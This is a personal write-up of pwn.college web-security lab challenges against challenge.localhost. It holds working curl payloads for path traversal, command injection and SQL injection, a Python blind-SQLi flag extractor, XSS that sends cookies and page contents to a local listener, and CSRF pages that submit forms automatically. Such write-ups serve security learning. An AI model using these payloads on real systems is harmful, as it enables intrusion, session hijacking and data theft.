@@ -1,0 +1,235 @@
+Content Injection
+
+1) Path Traversal 1
+Simple path traversal.
+
+curl --path-as-is http://challenge.localhost/data/../../flag
+
+2) Path Traversal 2
+Simple path traversal, but the program .strip()'s '/.'.
+
+curl --path-as-is -v http://challenge.localhost/assets/fortunes/../../../flag/../
+
+3) CMDi 1
+
+curl --path-as-is http://challenge.localhost/serve?top-path=/flag%3Bcat%20/flag
+
+4) CMDi 2
+
+curl --path-as-is http://challenge.localhost/puzzle?folder=/%26%26cat%20/flag
+
+5) CMDi 3
+
+curl --path-as-is http://challenge.localhost/milestone?prefix=/flag%27%3Bcat%20/flag%27
+
+6) CMDi 4
+
+curl --path-as-is http://challenge.localhost/challenge?tz-value=nyancat%3Bcat%20/flag
+
+7) CMDi 5
+I didn't get the result of the commands being run here, so I made it create a file, read /flag, and write the flag into that file, which I can read on my own account.
+
+curl --path-as-is http://challenge.localhost/test?target-file=/challenge/test%3Bcat%20/flag%3E/challenge/test; cat /challenge/test
+
+8) CMDi 6
+In this challenge the program was deleting almost every character that can be used to chain commands together, except newline.
+
+curl --path-as-is http://challenge.localhost/task?root=/challenge%0Acat%20/flag
+
+9) Authentication Bypass 1
+
+curl http://challenge.localhost/?session_user=admin
+
+10) Authentication Bypass 2
+
+curl -b session_user=admin http://challenge.localhost
+
+11) SQLi 1
+
+curl -v -d "user=admin&pin=0123 OR 1=1; --'" http://challenge.localhost/portal; curl -b 'session=your_session_id' http://challenge.localhost/portal
+
+12) SQLi 2
+
+curl -v -d "login-name=admin&account-password=idk' OR 1=1;--" http://challenge.localhost/authorize; curl -b 'session=your_session_id' http://challenge.localhost/authorize
+
+13) SQLi 3
+
+curl http://challenge.localhost/?query=admin%22%20UNION%20ALL%20SELECT%20password%20FROM%20users%22
+
+14) SQLi 4
+
+curl http://challenge.localhost/?query=admin%22%20UNION%20ALL%20SELECT%20tbl_name%20FROM%20sqlite_master%22; curl http://challenge.localhost/?query=admin%22%20UNION%20ALL%20SELECT%20password%20FROM%20users_[random]%22
+
+15) SQLi 5
+
+Got this cUrl command where I get a 302 for guessing a character in the flag right and 403 for guessing wrong:
+
+curl -s -i -X POST http://challenge.localhost/ --data-urlencode "username=admin" --data-urlencode "password=' OR ((SELECT password FROM users WHERE username='admin') GLOB 'pwn.college{*') OR 'x'='"
+
+I'd have to try every character by hand and I didn't want to spend hours writing the code, so I asked the AI to automate it:
+
+import requests
+
+URL = "http://challenge.localhost/"
+
+def oracle_prefix(prefix: str) -> bool:
+    # Escape any single quotes just in case (flags usually don't have them)
+    esc = prefix.replace("'", "''")
+    payload = f"' OR ((SELECT password FROM users WHERE username='admin') GLOB '{esc}*') OR 'x'='"
+    r = requests.post(
+        URL,
+        data={"username": "admin", "password": payload},
+        allow_redirects=False,  # 302 vs 403 is our signal
+        timeout=5,
+    )
+    
+    return r.status_code == 302
+
+def extract_flag():
+    prefix = "pwn.college{"  
+    alphabet = "}.-0123456789qwertyuopasdfghjklizxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_"
+    while True:
+        for c in alphabet:
+            if oracle_prefix(prefix + c):
+                prefix += c
+                print(prefix)
+                if c == '}':
+                    return prefix
+                break
+        else:
+            raise RuntimeError(f"No match for next char after: {prefix}.")
+
+if __name__ == "__main__":
+    print("oracle ok?", oracle_prefix("pwn.college{"))
+    print("flag:", extract_flag())
+
+
+At first I got only lowercase characters so changed the LIKE to GLOB, since apparently LIKE is case insensitive meanwhile GLOB is.
+I'll try to re-do without relying on AI assistance.
+
+
+Cross Site Scripting
+
+1) XSS 1
+Stored XSS.
+
+curl -d "content=<input><input>" http://challenge.localhost; /challenge/victim
+
+2) XSS 2
+Stored XSS.
+
+curl -d "content=<script>alert('PWNED')</script>" http://challenge.localhost; /challenge/victim
+
+3) XSS 3
+Reflected XSS.
+
+/challenge/victim http://challenge.localhost/?msg="<script>alert('PWNED')</script>"
+
+4) XSS 4
+Reflected XSS.
+
+/challenge/victim http://challenge.localhost/?msg="</textarea><script>alert('PWNED')</script>"
+
+5) XSS 5
+Go to http://challenge.localhost/, put <script>let a = fetch("http://challenge.localhost/publish")</script> in the Post textbox and click Publish and save. Run /challenge/victim and you should see the flag in http://challenge.localhost/.
+
+Or:
+
+curl -d "username=guest&password=password" http://challenge.localhost/login -c cj.txt -b cj.txt; curl -b cj.txt -c cj.txt http://challenge.localhost/draft -d 'content=<script>let a = fetch("http://challenge.localhost/publish")</script>'; curl -b cj.txt -c cj.txt http://challenge.localhost/publish; /challenge/victim; curl -b cj.txt -c cj.txt http://challenge.localhost/ | grep pwn.college
+
+6) XSS 6
+
+curl -c cj.txt -b cj.txt -d "username=guest&password=password" http://challenge.localhost/login; curl -c cj.txt -b cj.txt -d 'content=<script>let a = fetch("http://challenge.localhost/publish", { method: "POST" })</script>' http://challenge.localhost/draft; curl -c cj.txt -b cj.txt -X POST http://challenge.localhost/publish; /challenge/victim; curl -c cj.txt -b cj.txt http://challenge.localhost | grep pwn.college
+
+7) XSS 7
+
+nc -nvlp 4444 (in another window)
+
+curl -c cj.txt -b cj.txt -d "username=guest&password=password" http://challenge.localhost/login; curl -c cj.txt -b cj.txt -d "publish='yes'" -d 'content=<script>let a = fetch("http://127.0.0.1:4444/" %2B document.cookie)</script>' http://challenge.localhost/draft; /challenge/victim; 
+Then we get the cookie in nc.
+
+curl -b 'auth=admin|[password]' http://challenge.localhost/ | grep pwn.college
+
+
+
+
+
+Cross-Site Request Forgery
+
+1) CSRF 1
+
+Run:
+	/challenge/server &
+
+In another window, run
+	nc -tunlp 1337
+
+In another window, run
+	/challenge/victim
+
+The nc session will receive a HTTP request.
+Respond with the following:
+
+HTTP/1.1 302 Found
+Location: http://challenge.localhost/publish
+
+
+Then, login with provided credentials and check to see if the flag is published:
+curl -d "username=hacker&password=1337" -c cj.txt -b cj.txt http://challenge.localhost/login -L
+
+2) CSRF 2
+
+I couldn't see if there is a way to use a HTTP redirect for a POST request so I tried doing it like this.
+Created an index.html file with the following:
+
+<form name="myform" action="http://challenge.localhost/publish" method="POST">
+        <input type="hidden" value="test"/>
+</form>
+
+<script>
+document.forms["myform"].submit();
+</script>
+
+Then ran:
+python3 -m http.server 1337
+
+In another window, ran /challenge/server and /challenge/victim.
+
+Then got the flag by running:
+curl -d "username=hacker&password=1337" -c cj.txt -b cj.txt http://challenge.localhost/login -L
+
+3) CSRF 3
+
+In this case, the challenge wants us to trigger an alert() from http://challenge.localhost/ephemeral.
+
+I created an index.html file with the following content:
+
+<meta http-equiv="refresh" content="0; url=http://challenge.localhost/ephemeral?msg=<script>alert('PWNED')</script>" >
+
+and served it via
+python3 -m http.server 1337
+
+Then ran /challenge/server and /challenge/victim and got the flag. (CSRF+XSS)
+
+4) CSRF 4
+
+I created an index.html file with the following content and served via "python3 -m http.server 1337":
+
+<meta http-equiv="refresh" content="0; url=http://challenge.localhost/ephemeral?msg=<script>fetch('http://127.0.0.1:1337/')</script>" >
+
+After running /challenge/server and /challenge/victim I get the auth cookie in the listener I am running on port 1337. Then:
+
+curl -b "auth=admin|[password]" http://challenge.localhost | grep pwn.college
+
+(CSRF+XSS and exfiltrating the cookie via JS)
+
+5) CSRF 5
+
+I created an index.html file with the following content and served via "python3 -m http.server 1337":
+
+<script>location.href = "http://challenge.localhost/ephemeral?msg="+"%3Cscript%3Efetch%28%22http%3A%2F%2Fchallenge%2Elocalhost%2F%22%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28t%3D%3Efetch%28%22127%2E0%2E0%2E1%3A1337%3Fmsg%3D%22%2Bt%29%29%3C%2Fscript%3E"</script>
+
+This is what it says without the URL encoding:
+<script>fetch("http://challenge.localhost/").then(r=>r.text()).then(t=>fetch("127.0.0.1:1337?msg="+t))</script>
+
+Since we can't read the cookie through JS here, we just use the session we have and send our listener what our homepage would have displayed if we logged in as authenticated. Running the listener, /challenge/server and /challenge/victim gets us the flag.
